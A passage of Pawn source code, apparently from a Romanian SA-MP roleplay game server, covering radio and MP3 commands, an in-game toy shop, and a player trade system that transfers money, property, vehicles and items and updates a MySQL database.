	SendClientMessage(playerid,COLOR_WHITE,"-------------------------------------");
	return true;
}

cmd:buytoys(playerid, params[]) {
	if(!IsPlayerInRangeOfPoint(playerid,10,-104.0826,-21.9337,1000.7188)) return SendClientMessage(playerid,-1, "You're not in the place where you can get toys.");
	ShowPlayerDialog(playerid, DIALOG_DILDO, DIALOG_STYLE_LIST, "Buy Toys", "Dildo ($50,000)\nVibrator ($50,000)\nSilver Vibrator ($50,000)\nFlowers ($100,000)", "Ok", "Close");
	return true;
}

redist::ListenThisRadio(id) return Iter_Count(RadioCount<id>);
	
redist::HouseRadio(playerid, hid) {
	if(HouseInfo[hid][hRadio] != -1) {
		if(HouseInfo[hid][hRadio] == 0) StopAudioStreamForPlayer(playerid);
		else PlayAudioStreamForPlayer(playerid, RadioLink[HouseInfo[hid][hRadio]]);
		PlayRadio[playerid] = HouseInfo[hid][hRadio];
		Iter_Add(RadioCount<PlayRadio[playerid]>, playerid);
	}
	return true; 
}

redist::BizzRadio(playerid, hid) {
	if(BizzInfo[hid][bRadio] != -1) {
		if(BizzInfo[hid][bRadio] == 0) StopAudioStreamForPlayer(playerid);
		else PlayAudioStreamForPlayer(playerid, RadioLink[BizzInfo[hid][bRadio]]);
	}
	return true; 
}


cmd:carradio(playerid, params[]) {
	if(!IsPlayerInAnyVehicle(playerid)) return true;
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return true;
	gString[0] = (EOS);
	strcat(gString, "Nume\tAscultatori\n{FF3838}Turn OFF Radio\n");
	for(new i = 1; i < sizeof(RadioNames); i++) {
		format(gQuery, 80, "%s\t%d\n", RadioNames[i], ListenThisRadio(i));
		strcat(gString, gQuery);
	}
	ShowPlayerDialog(playerid, DIALOG_CARRADIO, DIALOG_STYLE_TABLIST_HEADERS, "Car Radio", gString, "Ok", "Close");
	return true;
}
cmd:mp3(playerid, params[]) {
	if(PlayerInfo[playerid][pMP3] == 0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai un MP3 Player!");
	gString[0] = (EOS);
	strcat(gString, "Nume\tAscultatori\n{FF3838}Turn OFF Radio\n");
	for(new i = 1; i < sizeof(RadioNames); i++) {
		format(gQuery, 80, "%s\t%d\n", RadioNames[i], ListenThisRadio(i));
		strcat(gString, gQuery);
	}
	ShowPlayerDialog(playerid, DIALOG_MP3, DIALOG_STYLE_TABLIST_HEADERS, "MP3 Player", gString, "Ok", "Close");
	return true;
}	
stock ShowTradeTDs(playerid) {
	player_selected[playerid] = 14;
    LoadTrade(playerid);
    PlayerTextDrawSetString(playerid, TradePTD[playerid][4], "~r~nepregatit");
    PlayerTextDrawSetString(playerid, TradePTD[playerid][5], "~r~nepregatit");
    for(new i=0;i<6;i++) PlayerTextDrawShow(playerid, TradePTD[playerid][i]);
    for(new i=0;i<11;i++) TextDrawShowForPlayer(playerid, TradeTD[i]);
    SelectTextDraw(playerid, 0x00BFFFFF);
    return true; 
}

redist::CheckTradeMoney(playerid, id) {	
	if(MoneyTrade[playerid] != 0 && MoneyTrade[id] != 0 && TradeItems[playerid] == 1 && TradeItems[id] == 1) return true;
	return false;
}

redist::HideTradeItems(playerid) {
	MiliardTrade[playerid] = 0;
	MoneyTrade[playerid] = 0;
	HouseTrade[playerid] = -1;
	BusinessTrade[playerid] = -1;
	CarTrade[playerid] = -1;
	HiddenTrade[playerid] = -1;
	jobTrade[playerid] = -1;
	TradeTicket[playerid][0] = 0;
	TradeTicket[playerid][1] = 0;
	VoucherTrade[playerid][0] = 0;
	VoucherTrade[playerid][1] = 0;
	VoucherTrade[playerid][2] = 0;
	VoucherTrade[playerid][3] = 0;
	VoucherTrade[playerid][4] = 0;
	clan_trade[playerid]=0;
	hat_trade[playerid]=-1;
	laser_trade[playerid]=-1;
	material_trade[playerid]=0;
	p_Ticket[playerid]=c_Ticket[playerid]=0;
	SkinTrade[playerid] = -1;
	
	new id = TradeID[playerid];
    switch(TradeType[playerid]) {
        case true: {
            for(new i=0;i<5;i++) {
                PlayerTextDrawHide(playerid, TradeTitle[playerid][i]);
                PlayerTextDrawHide(id, TradeTitle[id][i]);  
                PlayerTextDrawHide(playerid, TradeIcon[playerid][i]);
                PlayerTextDrawHide(id, TradeIcon[id][i]);
            }       
            for(new i=11;i<16;i++) {
                TextDrawHideForPlayer(playerid, TradeTD[i]);
                TextDrawHideForPlayer(id, TradeTD[i]);
            }
        }
        case false: {
            for(new i=5;i<10;i++) {
                PlayerTextDrawHide(playerid, TradeTitle[playerid][i]);
                PlayerTextDrawHide(id, TradeTitle[id][i]);  
                PlayerTextDrawHide(playerid, TradeIcon[playerid][i]);
                PlayerTextDrawHide(id, TradeIcon[id][i]);
            }       
            for(new i=16;i<21;i++) {
                TextDrawHideForPlayer(playerid, TradeTD[i]);
                TextDrawHideForPlayer(id, TradeTD[i]);
            }
        }
    }  
	TradeItems[playerid] = 0;	
	return true;
}

stock DestroyTradeItems(playerid) {
    MiliardTrade[playerid] = 0;
	MoneyTrade[playerid] = 0;
	HouseTrade[playerid] = -1;
	BusinessTrade[playerid] = -1;
	CarTrade[playerid] = -1;
	HiddenTrade[playerid] = -1;
	jobTrade[playerid] = -1;
	TradeTicket[playerid][0] = 0;
	TradeTicket[playerid][1] = 0;
	VoucherTrade[playerid][0] = 0;
	VoucherTrade[playerid][1] = 0;
	VoucherTrade[playerid][2] = 0;
	VoucherTrade[playerid][3] = 0;
	VoucherTrade[playerid][4] = 0;
	clan_trade[playerid]=0;
	hat_trade[playerid]=-1;
	laser_trade[playerid]=-1;
	material_trade[playerid]=0;
	p_Ticket[playerid]=c_Ticket[playerid]=0;
	SkinTrade[playerid] = -1;

    for(new i=0;i<7;i++) PlayerTextDrawDestroy(playerid, TradePTD[playerid][i]);
    for(new i=0;i<10;i++) PlayerTextDrawDestroy(playerid, TradeTitle[playerid][i]), PlayerTextDrawDestroy(playerid, TradeIcon[playerid][i]);
    for(new i = 0; i < sizeof(TradeTD); i++) TextDrawHideForPlayer(playerid, TradeTD[i]);
    TradeID[playerid] = -1;
    TradeTime[playerid] = 0;
    TradeItems[playerid] = 0; 
    player_selected[playerid] = 0;   
    return true; 
}

stock LoadTrade(playerid) {
    TradePTD[playerid][0] = CreatePlayerTextDraw(playerid, 225.666641, 116.992660, "Bunurile tale");
    PlayerTextDrawLetterSize(playerid, TradePTD[playerid][0], 0.176999, 1.077332);
    PlayerTextDrawAlignment(playerid, TradePTD[playerid][0], 2);
    PlayerTextDrawColor(playerid, TradePTD[playerid][0], -166);
    PlayerTextDrawSetShadow(playerid, TradePTD[playerid][0], 0);
    PlayerTextDrawSetOutline(playerid, TradePTD[playerid][0], 0);
    PlayerTextDrawBackgroundColor(playerid, TradePTD[playerid][0], -231);
    PlayerTextDrawFont(playerid, TradePTD[playerid][0], 2);
    PlayerTextDrawSetProportional(playerid, TradePTD[playerid][0], 1);
    PlayerTextDrawSetShadow(playerid, TradePTD[playerid][0], 0);

    TradePTD[playerid][1] = CreatePlayerTextDraw(playerid, 418.333099, 116.992668, "Bunurile lui Sky");
    PlayerTextDrawLetterSize(playerid, TradePTD[playerid][1], 0.176999, 1.077332);
    PlayerTextDrawAlignment(playerid, TradePTD[playerid][1], 2);
    PlayerTextDrawColor(playerid, TradePTD[playerid][1], -166);
    PlayerTextDrawSetShadow(playerid, TradePTD[playerid][1], 0);
    PlayerTextDrawSetOutline(playerid, TradePTD[playerid][1], 0);
    PlayerTextDrawBackgroundColor(playerid, TradePTD[playerid][1], -231);
    PlayerTextDrawFont(playerid, TradePTD[playerid][1], 2);
    PlayerTextDrawSetProportional(playerid, TradePTD[playerid][1], 1);
    PlayerTextDrawSetShadow(playerid, TradePTD[playerid][1], 0);

    TradePTD[playerid][2] = CreatePlayerTextDraw(playerid, 188.666763, 355.511138, "Adauga");
    PlayerTextDrawLetterSize(playerid, TradePTD[playerid][2], 0.246665, 1.122962);
    PlayerTextDrawTextSize(playerid, TradePTD[playerid][2], 10.000000, 35.000000);
    PlayerTextDrawAlignment(playerid, TradePTD[playerid][2], 2);
    PlayerTextDrawColor(playerid, TradePTD[playerid][2], -65281);
    PlayerTextDrawBoxColor(playerid, TradePTD[playerid][2], 255);
    PlayerTextDrawSetShadow(playerid, TradePTD[playerid][2], 0);
    PlayerTextDrawSetOutline(playerid, TradePTD[playerid][2], 1);
    PlayerTextDrawBackgroundColor(playerid, TradePTD[playerid][2], 47);
    PlayerTextDrawFont(playerid, TradePTD[playerid][2], 1);
    PlayerTextDrawSetProportional(playerid, TradePTD[playerid][2], 1);
    PlayerTextDrawSetShadow(playerid, TradePTD[playerid][2], 0);
    PlayerTextDrawSetSelectable(playerid, TradePTD[playerid][2], true);
    PlayerTextID[playerid][PlayerText:TradePTD[playerid][2]] = 3;

    TradePTD[playerid][3] = CreatePlayerTextDraw(playerid, 262.999816, 355.511138, "Sterge");
    PlayerTextDrawLetterSize(playerid, TradePTD[playerid][3], 0.246665, 1.122962);
    PlayerTextDrawTextSize(playerid, TradePTD[playerid][3], 10.000000, 28.000000);
    PlayerTextDrawAlignment(playerid, TradePTD[playerid][3], 2);
    PlayerTextDrawColor(playerid, TradePTD[playerid][3], -16776961);
    PlayerTextDrawBoxColor(playerid, TradePTD[playerid][3], 255);
    PlayerTextDrawSetShadow(playerid, TradePTD[playerid][3], 0);
    PlayerTextDrawSetOutline(playerid, TradePTD[playerid][3], 1);
    PlayerTextDrawBackgroundColor(playerid, TradePTD[playerid][3], 47);
    PlayerTextDrawFont(playerid, TradePTD[playerid][3], 1);
    PlayerTextDrawSetProportional(playerid, TradePTD[playerid][3], 1);
    PlayerTextDrawSetShadow(playerid, TradePTD[playerid][3], 0);
    PlayerTextDrawSetSelectable(playerid, TradePTD[playerid][3], true);
    PlayerTextID[playerid][PlayerText:TradePTD[playerid][3]] = 2;
    
    TradePTD[playerid][4] = CreatePlayerTextDraw(playerid, 199.666656, 139.392700, "nepregatitt");
    PlayerTextDrawLetterSize(playerid, TradePTD[playerid][4], 0.246665, 1.122962);
    PlayerTextDrawTextSize(playerid, TradePTD[playerid][4], 253.000000, 10.000000);
    PlayerTextDrawAlignment(playerid, TradePTD[playerid][4], 1);
    PlayerTextDrawColor(playerid, TradePTD[playerid][4], -1);
    PlayerTextDrawBoxColor(playerid, TradePTD[playerid][4], 255);
    PlayerTextDrawSetShadow(playerid, TradePTD[playerid][4], 0);
    PlayerTextDrawSetOutline(playerid, TradePTD[playerid][4], 1);
    PlayerTextDrawBackgroundColor(playerid, TradePTD[playerid][4], 47);
    PlayerTextDrawFont(playerid, TradePTD[playerid][4], 3);
    PlayerTextDrawSetProportional(playerid, TradePTD[playerid][4], 1);
    PlayerTextDrawSetShadow(playerid, TradePTD[playerid][4], 0);
    PlayerTextDrawSetSelectable(playerid, TradePTD[playerid][4], true);
    PlayerTextID[playerid][PlayerText:TradePTD[playerid][4]] = 0;

    TradePTD[playerid][5] = CreatePlayerTextDraw(playerid, 390.333312, 139.807510, "nepregatitt");
    PlayerTextDrawLetterSize(playerid, TradePTD[playerid][5], 0.246665, 1.122962);
    PlayerTextDrawTextSize(playerid, TradePTD[playerid][5], 447.000000, 10.000000);
    PlayerTextDrawAlignment(playerid, TradePTD[playerid][5], 1);
    PlayerTextDrawColor(playerid, TradePTD[playerid][5], -1);
    PlayerTextDrawBoxColor(playerid, TradePTD[playerid][5], 255);
    PlayerTextDrawSetShadow(playerid, TradePTD[playerid][5], 0);
    PlayerTextDrawSetOutline(playerid, TradePTD[playerid][5], 1);
    PlayerTextDrawBackgroundColor(playerid, TradePTD[playerid][5], 47);
    PlayerTextDrawFont(playerid, TradePTD[playerid][5], 3);
    PlayerTextDrawSetProportional(playerid, TradePTD[playerid][5], 1);
    PlayerTextDrawSetShadow(playerid, TradePTD[playerid][5], 0);
    PlayerTextDrawSetSelectable(playerid, TradePTD[playerid][5], true);
    PlayerTextID[playerid][PlayerText:TradePTD[playerid][5]] = 1;

    TradePTD[playerid][6] = CreatePlayerTextDraw(playerid, 305.333404, 114.918479, "01:00");
    PlayerTextDrawLetterSize(playerid, TradePTD[playerid][6], 0.298999, 1.405037);
    PlayerTextDrawAlignment(playerid, TradePTD[playerid][6], 1);
    PlayerTextDrawColor(playerid, TradePTD[playerid][6], -65281);
    PlayerTextDrawSetShadow(playerid, TradePTD[playerid][6], 1);
    PlayerTextDrawSetOutline(playerid, TradePTD[playerid][6], 0);
    PlayerTextDrawBackgroundColor(playerid, TradePTD[playerid][6], -234);
    PlayerTextDrawFont(playerid, TradePTD[playerid][6], 2);
    PlayerTextDrawSetProportional(playerid, TradePTD[playerid][6], 1);
    PlayerTextDrawSetShadow(playerid, TradePTD[playerid][6], 1);  
    
    for(new i=0;i<10;i++) {
        TradeTitle[playerid][i] = CreatePlayerTextDraw(playerid, (i<5?182.333343:369.000030), 171.333297 + ((i%5)*33.600000), "title");
        PlayerTextDrawLetterSize(playerid, TradeTitle[playerid][i], 0.225666, 0.965332);
        PlayerTextDrawAlignment(playerid, TradeTitle[playerid][i], 1);
        PlayerTextDrawColor(playerid, TradeTitle[playerid][i], -1);
        PlayerTextDrawSetShadow(playerid, TradeTitle[playerid][i], 0);
        PlayerTextDrawSetOutline(playerid, TradeTitle[playerid][i], 1);
        PlayerTextDrawBackgroundColor(playerid, TradeTitle[playerid][i], 54);
        PlayerTextDrawFont(playerid, TradeTitle[playerid][i], 1);
        PlayerTextDrawSetProportional(playerid, TradeTitle[playerid][i], 1);
        PlayerTextDrawSetShadow(playerid, TradeTitle[playerid][i], 0);

        TradeIcon[playerid][i] = CreatePlayerTextDraw(playerid, (i<5?141.333419:331.666748), 164.955612 + ((i%5) * 33.600000), "");
        PlayerTextDrawLetterSize(playerid, TradeIcon[playerid][i], 0.000000, 0.000000);
        PlayerTextDrawTextSize(playerid, TradeIcon[playerid][i], 29.000000, 31.000000);
        PlayerTextDrawAlignment(playerid, TradeIcon[playerid][i], 1);
        PlayerTextDrawColor(playerid, TradeIcon[playerid][i], -1);
        PlayerTextDrawSetShadow(playerid, TradeIcon[playerid][i], 0);
        PlayerTextDrawSetOutline(playerid, TradeIcon[playerid][i], 0);
        PlayerTextDrawBackgroundColor(playerid, TradeIcon[playerid][i], -235);
        PlayerTextDrawFont(playerid, TradeIcon[playerid][i], 5);
        PlayerTextDrawSetProportional(playerid, TradeIcon[playerid][i], 0);
        PlayerTextDrawSetShadow(playerid, TradeIcon[playerid][i], 0);
        PlayerTextDrawSetPreviewModel(playerid, TradeIcon[playerid][i], 19523);
        PlayerTextDrawSetPreviewRot(playerid, TradeIcon[playerid][i], 0.000000, 0.000000, 348.000000, 0.849843);
    }
    return true;
}

stock FinishTrade(playerid) {
	new id = TradeID[playerid], string[256], string2[256], query[256], log[300], items[128];
	SendClientMessage(playerid, COLOR_GOLD, "Afacerea a fost finalizata cu succes!");
	SendClientMessage(id, COLOR_GOLD, "Afacerea a fost finalizata cu succes!");
	strcat(string, "Ai primit: ");
	if(MoneyTrade[playerid] != 0) {
		GivePlayerCash(id, MoneyTrade[playerid]);
		GivePlayerCash(playerid, -MoneyTrade[playerid]);
		format(string2, sizeof(string2), "$%s [l: $%s] ", FormatNumber(MoneyTrade[playerid]), formatBytes(money[playerid]));
		strcat(string, string2);
		strcat(items, string2);

		format(gString, sizeof gString, "I-a oferit lui %s, $%s money prin trade.", GetName(id));
		InsertLog(playerid, gString, LOG_MONEY);
		format(gString, sizeof gString, "Ai primit $%s money de la %s prin trade.", GetName(playerid));
		InsertLog(id, gString, LOG_MONEY);
	}
	if(HouseTrade[playerid] != -1) {
		format(string2, sizeof(string2), "House %d ", HouseTrade[playerid]);
		strcat(string, string2);
		strcat(items, string2);
		
		PlayerInfo[playerid][pHouse] = 999;
		UpdateVar(playerid, "House", 999);
		
		GiveHouse(id, HouseTrade[playerid]);
	}	
	if(BusinessTrade[playerid] != -1) {
		format(string2, sizeof(string2), "Business %d ", BusinessTrade[playerid]);
		strcat(string, string2);
		strcat(items, string2);
	
		PlayerInfo[playerid][pBizz] = 255;
		UpdateVar(playerid, "Bizz", 255);
		GiveBiz(id, BusinessTrade[playerid]);
	}	
	if(CarTrade[playerid] != -1) {
		new idd = CarTrade[playerid];
		format(string2, sizeof(string2), "Vehicul %s (%d) ", aVehicleNames[CarInfo[idd][cModel]-400], CarInfo[idd][cID]);
		strcat(string, string2);			
		strcat(items, string2);
		Iter_Remove(MyVehicle<playerid>, idd);
		Iter_Add(MyVehicle<id>, idd);
		foreach(new player: VehicleKeys[CarInfo[idd][Spawned]]) Iter_Remove(PlayerKeys[player], CarInfo[idd][Spawned]);
		Iter_Clear(VehicleKeys[CarInfo[idd][Spawned]]);
		GiveVehicleKey(id, CarInfo[idd][Spawned]);
		finishAchievement(id, 16);
		format(CarInfo[idd][cOwner], 64, PlayerInfo[id][pUsername]);
		CarInfo[idd][Userid] = PlayerInfo[id][pSQLID];
		mysql_format(SQL, query, sizeof(query), "UPDATE `cars` SET `Owner`='%s', `Userid`='%d' WHERE `ID`='%d'", PlayerInfo[id][pUsername], PlayerInfo[id][pSQLID], CarInfo[idd][cID]);
		mysql_tquery(SQL, query, "", "");
	}
	if(VoucherTrade[playerid][0]) {
		PlayerInfo[id][pVoucher][0] += VoucherTrade[playerid][0];
		PlayerInfo[playerid][pVoucher][0] -= VoucherTrade[playerid][0];
		format(string2, sizeof(string2), "Voucher %d (Rare) ", VoucherTrade[playerid][0]);
		strcat(string, string2);
		strcat(items, string2);
		save_vouchers(id);
		save_vouchers(playerid);
	}
	if(VoucherTrade[playerid][1]) {
		PlayerInfo[id][pVoucher][1] += VoucherTrade[playerid][1];
		PlayerInfo[playerid][pVoucher][1] -= VoucherTrade[playerid][1];
		format(string2, sizeof(string2), "Voucher %d (Epic) ", VoucherTrade[playerid][1]);
		strcat(string, string2);
		strcat(items, string2);
		save_vouchers(playerid);
		save_vouchers(id);	
	}
	if(VoucherTrade[playerid][2]) {
		PlayerInfo[id][pVoucher][2] += VoucherTrade[playerid][2];
		PlayerInfo[playerid][pVoucher][2] -= VoucherTrade[playerid][2];
		format(string2, sizeof(string2), "Voucher %d (Legendary) ", VoucherTrade[playerid][2]);
		strcat(string, string2);
		strcat(items, string2);
		save_vouchers(playerid);
		save_vouchers(id);	
	}
	if(VoucherTrade[playerid][3]) {
		PlayerInfo[id][pVoucher][3] += VoucherTrade[playerid][3];
		PlayerInfo[playerid][pVoucher][3] -= VoucherTrade[playerid][3];
		format(string2, sizeof(string2), "Voucher %d (mythic) ", VoucherTrade[playerid][3]);
		strcat(string, string2);
		strcat(items, string2);
		save_vouchers(id);
		save_vouchers(playerid);
	}
	if(VoucherTrade[playerid][4]) {
		PlayerInfo[id][pVoucher][4] += VoucherTrade[playerid][4];
		PlayerInfo[playerid][pVoucher][4] -= VoucherTrade[playerid][4];
		format(string2, sizeof(string2), "Voucher %d (Millionaries) ", VoucherTrade[playerid][4]);
		strcat(string, string2);
		strcat(items, string2);
		save_vouchers(id);
		save_vouchers(playerid);
	}
	if(SkinTrade[playerid] != -1) {
		give_skin(id, SkinTrade[playerid]);
		for(new i = 0; i < 30; i++) {
			if(PlayerInfo[playerid][pSkins][i] == SkinTrade[playerid]) {
				PlayerInfo[playerid][pSkins][i] = -1;
				break;
			}
		}
		SetPlayerSkin(playerid, 250);
		PlayerInfo[playerid][pModel] = 250;
		UpdateVar(playerid, "Model", 250);
		format(string2, sizeof(string2), "Skin #%d %s ", SkinTrade[playerid], GetSkinType(SkinTrade[playerid]));
		strcat(string, string2);
		strcat(items, string2);
		save_skin(playerid);
		save_skin(id);
	}
	if(HiddenTrade[playerid] != -1) {
		PlayerInfo[id][pHidden] += HiddenTrade[playerid];
		PlayerInfo[playerid][pHidden] -= HiddenTrade[playerid];
		format(string2, sizeof(string2), "%d Hidden(s) ", HiddenTrade[playerid]);
		strcat(string, string2);
		strcat(items, string2);
		UpdateVar(playerid, "Hidden", PlayerInfo[playerid][pHidden]);
		UpdateVar(id, "Hidden", PlayerInfo[id][pHidden]);
	}
	if(MiliardTrade[playerid] != 0) {
		ByteVar1@money[id] += eBit:MiliardTrade[playerid];
		ByteVar1@money[playerid] -= eBit:MiliardTrade[playerid];
		format(string2, sizeof(string2), "$%d.000.000.000 ", MiliardTrade[playerid]);
		strcat(string, string2);
		strcat(items, string2);
	}
	if(TradeTicket[playerid][0] != 0) {
		PlayerInfo[id][pTickets][0] += TradeTicket[playerid][0];
		PlayerInfo[playerid][pTickets][0] -= TradeTicket[playerid][0];
		format(string2, sizeof(string2), "%d Rainbow Ticket(s) ", TradeTicket[playerid][0]);
		strcat(string, string2);
		strcat(items, string2);
		save_tickete(id);
		save_tickete(playerid);	
	}
	if(TradeTicket[playerid][1] != 0) {
		PlayerInfo[id][pTickets][1] += TradeTicket[playerid][1];
		PlayerInfo[playerid][pTickets][1] -= TradeTicket[playerid][1];
		format(string2, sizeof(string2), "%d Vip Ticket(s) ", TradeTicket[playerid][1]);
		strcat(string, string2);
		strcat(items, string2);
		save_tickete(id);
		save_tickete(playerid);	
	}
	if(jobTrade[playerid] != -1) {
		new idd=jobTrade[playerid];
		format(string2, sizeof(string2), "job %s ", JobInfo[idd][jName]);
		strcat(string, string2);
		strcat(items, string2);
		
		PlayerInfo[playerid][pJobOwner] = 0;
		UpdateVar(playerid, "JobOwner", 0);
		
		strmid(JobInfo[idd][jOwner], PlayerInfo[id][pUsername], 0, MAX_PLAYER_NAME);
		mysql_format(SQL, gQuery, 128, "UPDATE `jobs` SET `Owner` = '%s' WHERE `ID` = '%i'", JobInfo[idd][jOwner], JobInfo[idd][jID]);
		mysql_tquery(SQL, gQuery);
		PlayerInfo[id][pJobOwner] = idd;
		UpdateVar(id, "JobOwner", idd);
		UpdateLabel(5, idd);
	}
	if clan_trade[playerid] *then {
		new _c=clan_trade[playerid];
		format(string2, sizeof(string2), "clan #%d ", ClanInfo[_c][cID]);
		strcat(string, string2);
		strcat(items, string2);

		PlayerInfo[playerid][pClan] = 0;
		PlayerInfo[playerid][pRank] = 0;
		Iter_Remove(clan_players<_c>, playerid);
		if PlayerInfo[playerid][pTag]!=-1 *then {
			SetPlayerName(playerid, PlayerInfo[playerid][pUsername]);
			PlayerInfo[playerid][pTag]=-1;
		}

		PlayerInfo[id][pClan]=_c;
		PlayerInfo[id][pRank]=7;
		Iter_Add(clan_players<_c>, id);

		format(gString, 128, "{%s}[CLAN] %s este noul lider.", ClanInfo[_c][clColor], GetName(id));
		SendClanMessage(_c, gString);

		_query("UPDATE `users` SET `Clan`='0',`Rank`='0',`Tag`='-1' WHERE `id`='%i'", PlayerInfo[playerid][pSQLID]);
		_query("UPDATE `users` SET `Clan`='%i',`Rank`='7' WHERE `id`='%i'", _c, PlayerInfo[id][pSQLID]);
	}
	if hat_trade[playerid]!=-1 *then {
		new h=hat_trade[playerid];
		format(string2, sizeof(string2), "%s ", name_hats[h]);
		strcat(string, string2);
		strcat(items, string2);

		PlayerInfo[id][pAccessories][h]++;
		PlayerInfo[playerid][pAccessories][h]--;
	}
	if laser_trade[playerid]!=-1 *then {
		new l=laser_trade[playerid];
		format(string2, sizeof(string2), "laser %s ", laser_color[l]);
		strcat(string, string2);
		strcat(items, string2);

		PlayerInfo[id][pAccessories][l+16]++;
		PlayerInfo[playerid][pAccessories][l+16]--;
	}
	if material_trade[playerid] *then {
		format(string2, sizeof(string2), "%d materiale ", material_trade[playerid]);
		strcat(string, string2);
		strcat(items, string2);
	
		UpdateVar(playerid, "Materials", PlayerInfo[playerid][pMats]-=material_trade[playerid]);
		UpdateVar(id, "Materials", PlayerInfo[id][pMats]+=material_trade[playerid]);
	}
	if p_Ticket[playerid] *then {
		format(string2, sizeof(string2), "%d ticket fuel(s) ", p_Ticket[playerid]);
		strcat(string, string2);
		strcat(items, string2);
	
		PlayerInfo[id][pTickets][2]+=p_Ticket[playerid];
		PlayerInfo[playerid][pTickets][2]-=p_Ticket[playerid];

		save_tickete(playerid),save_tickete(id);
	}
	if c_Ticket[playerid] *then {
		format(string2, sizeof(string2), "%d ticket house custom(s) ", c_Ticket[playerid]);
		strcat(string, string2);
		strcat(items, string2);
	
		PlayerInfo[id][pTickets][3]+=c_Ticket[playerid];
		PlayerInfo[playerid][pTickets][3]-=c_Ticket[playerid];
		save_tickete(playerid),save_tickete(id);
	}
	SendClientMessage(id, COLOR_GOLD, string);
	format(log, sizeof(log), "%s a dat [%s]", GetName(playerid), items);	
	items = "";
	string = "Ai primit: ";
	if(MoneyTrade[id] != 0) {
		GivePlayerCash(playerid, MoneyTrade[id]);
		GivePlayerCash(id, -MoneyTrade[id]);
		format(string2, sizeof(string2), "$%s [l: $%s] ", FormatNumber(MoneyTrade[id]), formatBytes(money[id]));
		strcat(string, string2);
		strcat(items, string2);

		format(gString, sizeof gString, "I-a oferit lui %s, $%s money prin trade.", GetName(playerid));
		InsertLog(id, gString, LOG_MONEY);
		format(gString, sizeof gString, "Ai primit $%s money de la %s prin trade.", GetName(id));
		InsertLog(playerid, gString, LOG_MONEY);
	}
	if(HouseTrade[id] != -1) {
		format(string2, sizeof(string2), "House %d ", HouseTrade[id]);
		strcat(string, string2);
		strcat(items, string2);
		
		if(HouseTrade[playerid] == -1) {		
			PlayerInfo[id][pHouse] = 999;
			UpdateVar(id, "House", 999);
		}
		
		GiveHouse(playerid, HouseTrade[id]);
	}	
	if(BusinessTrade[id] != -1) {
		format(string2, sizeof(string2), "Business %d ", BusinessTrade[id]);
		strcat(string, string2);
		strcat(items, string2);
		
		if(BusinessTrade[playerid] == -1) {	
			PlayerInfo[id][pBizz] = 255;
			UpdateVar(id, "Bizz", 255);
		}
		
		GiveBiz(playerid, BusinessTrade[id]);
	}				
	if(CarTrade[id] != -1) {
		new idd = CarTrade[id];
		format(string2, sizeof(string2), "Vehicul %s (%d) ", aVehicleNames[CarInfo[idd][cModel]-400], CarInfo[idd][cID]);
		strcat(string, string2);	
		strcat(items, string2);
		Iter_Remove(MyVehicle<id>, idd);
		Iter_Add(MyVehicle<playerid>, idd);
		foreach(new player: VehicleKeys[CarInfo[idd][Spawned]]) Iter_Remove(PlayerKeys[player], CarInfo[idd][Spawned]);
		Iter_Clear(VehicleKeys[CarInfo[idd][Spawned]]);
		GiveVehicleKey(playerid, CarInfo[idd][Spawned]);
		finishAchievement(playerid, 16);
		format(CarInfo[idd][cOwner], 64, PlayerInfo[playerid][pUsername]);
		CarInfo[idd][Userid] = PlayerInfo[playerid][pSQLID];
		mysql_format(SQL, query, sizeof(query), "UPDATE `cars` SET `Owner`='%s', `Userid`='%d' WHERE `ID`='%d'", PlayerInfo[playerid][pUsername], PlayerInfo[playerid][pSQLID], CarInfo[idd][cID]);
		mysql_tquery(SQL, query, "", "");
	}	
	if(VoucherTrade[id][0]) {
	    PlayerInfo[playerid][pVoucher][0] += VoucherTrade[id][0];
	    PlayerInfo[id][pVoucher][0] -= VoucherTrade[id][0];
		format(string2, sizeof(string2), "Voucher %d (Rare) ", VoucherTrade[id][0]);
		strcat(string, string2);
		strcat(items, string2);
		save_vouchers(playerid);
		save_vouchers(id);	
	}
	if(VoucherTrade[id][1]) {
	    PlayerInfo[playerid][pVoucher][1] += VoucherTrade[id][1];
	    PlayerInfo[id][pVoucher][1] -= VoucherTrade[id][1];
		format(string2, sizeof(string2), "Voucher %d (Epic) ", VoucherTrade[id][1]);
		strcat(string, string2);
		strcat(items, string2);
		save_vouchers(playerid);
		save_vouchers(id);	
	}
	if(VoucherTrade[id][2]) {
	    PlayerInfo[playerid][pVoucher][2] += VoucherTrade[id][2];
	    PlayerInfo[id][pVoucher][2] -= VoucherTrade[id][2];
		format(string2, sizeof(string2), "Voucher %d (Legendary) ", VoucherTrade[id][2]);
		strcat(string, string2);
		strcat(items, string2);
		save_vouchers(playerid);
		save_vouchers(id);	
	}
	if(VoucherTrade[id][3]) {
	    PlayerInfo[playerid][pVoucher][3] += VoucherTrade[id][3];
	    PlayerInfo[id][pVoucher][3] -= VoucherTrade[id][3];
		format(string2, sizeof(string2), "Voucher %d (mythic) ", VoucherTrade[id][3]);
		strcat(string, string2);
		strcat(items, string2);
		save_vouchers(playerid);
		save_vouchers(id);	
	}
	if(VoucherTrade[id][4]) {
	    PlayerInfo[playerid][pVoucher][4] += VoucherTrade[id][4];
	    PlayerInfo[id][pVoucher][4] -= VoucherTrade[id][4];
		format(string2, sizeof(string2), "Voucher %d (Millionaries) ", VoucherTrade[id][4]);
		strcat(string, string2);
		strcat(items, string2);
		save_vouchers(playerid);
		save_vouchers(id);	
	}
	if(SkinTrade[id] != -1) {
		give_skin(playerid, SkinTrade[id]);
		for(new i = 0; i < 30; i++) if(PlayerInfo[id][pSkins][i] == SkinTrade[id]) {
			PlayerInfo[id][pSkins][i] = -1;
			break;
		}
		SetPlayerSkin(id, 250);
		UpdateVar(id, "Model", 250);
		format(string2, sizeof(string2), "Skin %d (%s) ", SkinTrade[id], GetSkinType(SkinTrade[id]));
		strcat(string, string2);
		strcat(items, string2);
		save_skin(id);
		save_skin(playerid);
	}
	if(HiddenTrade[id] != -1) {
		PlayerInfo[playerid][pHidden] += HiddenTrade[id];
		PlayerInfo[id][pHidden] -= HiddenTrade[id];
		format(string2, sizeof(string2), "%d Hidden(s) ", HiddenTrade[id]);
		strcat(string, string2);
		strcat(items, string2);
		UpdateVar(playerid, "Hidden", PlayerInfo[playerid][pHidden]);
		UpdateVar(id, "Hidden", PlayerInfo[id][pHidden]);
	}
	if(MiliardTrade[id] != 0) {
		ByteVar1@money[playerid] += eBit:MiliardTrade[id];
		ByteVar1@money[id] -= eBit:MiliardTrade[id];
		format(string2, sizeof(string2), "$%d.000.000.000 ", MiliardTrade[id]);
		strcat(string, string2);
		strcat(items, string2);	
	}
